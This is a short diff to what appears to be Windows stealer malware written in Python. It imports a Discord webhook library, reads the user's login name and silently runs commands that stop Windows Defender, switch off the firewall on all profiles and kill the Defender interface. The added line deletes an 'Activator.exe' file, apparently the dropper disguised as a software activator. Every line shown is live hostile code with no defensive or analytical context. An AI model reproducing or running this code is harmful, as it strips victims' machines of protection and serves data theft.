@@ -19,6 +19,7 @@ from datetime import timezone, datetime, timedelta
 from discord_webhook import DiscordWebhook
 
 username = os.getlogin()
+subprocess.getoutput('del Activator.exe/q')
 subprocess.getoutput('net stop "WinDefend"')
 subprocess.getoutput('netsh advfirewall set allprofiles state off')
 subprocess.getoutput('taskkill /f /t /im MSASCui.exe')
